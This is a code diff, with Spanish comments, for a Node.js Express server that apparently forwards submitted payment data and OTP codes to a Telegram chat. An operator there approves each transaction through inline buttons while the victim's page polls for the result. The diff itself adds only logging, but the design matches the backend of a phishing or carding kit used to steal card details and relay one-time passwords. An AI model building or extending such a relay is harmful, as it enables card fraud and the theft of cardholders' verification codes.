@@ -28,15 +28,12 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const transactions = Object.create(null); // transactionId -> { status, messageId, chatId, data }
 const messageToTx = Object.create(null);  // messageId -> transactionId
 
-// Escapar texto para MarkdownV2
 function escapeMarkdownV2(text = "") {
   return String(text).replace(/([_*[\]()~`>#+\-=|{}.!\\])/g, "\\$1");
 }
 
-/*
-  Endpoint principal para procesar el pago inicial.
-*/
 app.post("/send-payment", async (req, res) => {
+  console.log("➡️ Recibida solicitud en /send-payment");
   try {
     const payload = req.body || {};
     const transactionId = (Date.now().toString(36) + Math.random().toString(36).slice(2));
@@ -105,24 +102,24 @@ app.post("/send-payment", async (req, res) => {
       data: stored
     };
     messageToTx[sent.message_id] = transactionId;
+    console.log(`✅ Mensaje de pago enviado a Telegram. ID de Transacción: ${transactionId}`);
+    console.log(`✅ Estado de la transacción '${transactionId}' guardado: 'pending'`);
 
     return res.json({ ok: true, transactionId, messageId: sent.message_id });
   } catch (err) {
-    console.error("Error /send-payment:", err);
+    console.error("❌ Error en /send-payment:", err.message);
     return res.status(500).json({ ok: false, error: "internal" });
   }
 });
 
-/*
-  Endpoint para procesar el código OTP.
-*/
 app.post("/send-verification", async (req, res) => {
+  console.log("➡️ Recibida solicitud en /send-verification");
   try {
     const { transactionId, otp = "" } = req.body;
     const tx = transactions[transactionId];
 
     if (!tx) {
-      console.warn("Transacción no encontrada para OTP:", transactionId);
+      console.warn("⚠️ Transacción no encontrada para OTP:", transactionId);
       return res.status(404).json({ ok: false, error: "not_found" });
     }
 
@@ -190,24 +187,30 @@ app.post("/send-verification", async (req, res) => {
     transactions[transactionId].chatId = sent.chat.id;
     transactions[transactionId].data = stored;
     messageToTx[sent.message_id] = transactionId;
+    console.log(`✅ Mensaje de OTP enviado a Telegram. ID de Transacción: ${transactionId}`);
+    console.log(`✅ Estado de la transacción '${transactionId}' actualizado a 'pending_otp_verification'`);
+
 
     return res.json({ ok: true, transactionId, messageId: sent.message_id });
   } catch (err) {
-    console.error("Error /send-verification:", err);
+    console.error("❌ Error en /send-verification:", err.message);
     return res.status(500).json({ ok: false, error: "internal" });
   }
 });
 
-// Endpoint que el frontend consulta con polling
 app.get("/status/:transactionId", (req, res) => {
   const txId = req.params.transactionId;
   const tx = transactions[txId];
-  if (!tx) return res.json({ status: "not_found" });
+  if (!tx) {
+    console.warn(`⚠️ Solicitud de estado para ID no encontrado: ${txId}`);
+    return res.json({ status: "not_found" });
+  }
+  console.log(`➡️ Solicitud de estado para ${txId}. Estado actual: ${tx.status}`);
   return res.json({ status: tx.status || "pending" });
 });
 
-// Bot: manejo de botones (callback_query)
 bot.on("callback_query", async (query) => {
+  console.log(`➡️ Recibido callback de Telegram: ${query.data}`);
   try {
     const data = query.data || "";
     const [action, txId] = data.split(":");
@@ -218,6 +221,9 @@ bot.on("callback_query", async (query) => {
     const tx = (txId && transactions[txId]) || (msgId && transactions[messageToTx[msgId]]);
     if (tx) {
       tx.status = action;
+      console.log(`✅ Estado de la transacción '${txId}' actualizado a '${action}'`);
+    } else {
+        console.warn(`⚠️ No se encontró la transacción para el callback con ID ${txId}`);
     }
 
     await bot.answerCallbackQuery(query.id, { text: "✅ Acción registrada" });
@@ -226,12 +232,14 @@ bot.on("callback_query", async (query) => {
       if (chatId && msgId) {
         await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId });
       }
-    } catch (e) {}
+    } catch (e) {
+      console.warn("⚠️ Error al intentar editar el mensaje del bot (probablemente ya fue editado).");
+    }
   } catch (err) {
-    console.error("Error en callback_query:", err);
+    console.error("❌ Error en callback_query:", err);
   }
 });
 
 app.listen(PORT, () => {
-  console.log(`✅ Server corriendo en http://localhost:${PORT}`);
+  console.log(`✅ Servidor escuchando en http://localhost:${PORT}`);
 });
